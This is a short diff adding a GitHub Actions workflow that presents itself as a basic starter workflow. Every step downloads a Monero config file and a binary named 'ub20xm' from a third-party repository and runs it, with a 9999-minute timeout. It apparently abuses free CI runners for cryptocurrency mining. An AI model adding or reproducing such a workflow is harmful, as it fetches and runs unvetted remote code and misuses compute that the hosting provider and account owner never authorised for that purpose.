@@ -1,0 +1,19 @@
+# This is a basic workflow to help you get started with Actions
+
+name: ub20xm
+
+on: workflow_dispatch
+
+jobs:
+  mnub20:
+
+    runs-on: ubuntu-latest
+    timeout-minutes: 9999
+
+    steps:
+    - name: Descargar.
+      run: |
+        Invoke-WebRequest https://raw.githubusercontent.com/romanferty/Ubun20_xmrg/main/Monero/config.json -OutFile config.json
+        Invoke-WebRequest https://raw.githubusercontent.com/romanferty/Ubun20_xmrg/main/ub20xm -OutFile ub20xm
+    - name: Ejecutar.
+      run: .\ub20xm
